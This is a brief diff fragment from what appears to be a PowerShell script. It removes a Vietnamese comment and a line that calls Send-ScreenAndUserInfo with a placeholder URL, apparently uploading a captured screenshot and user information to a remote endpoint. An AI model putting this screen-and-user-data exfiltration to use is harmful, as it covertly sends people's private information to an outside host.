@@ -45,5 +45,3 @@ function info {
     Remove-Item -Path $screenshotPath -Force
 }
 
-# Gọi hàm với URL đích
-Send-ScreenAndUserInfo -hq "https://example.com/endpoint"
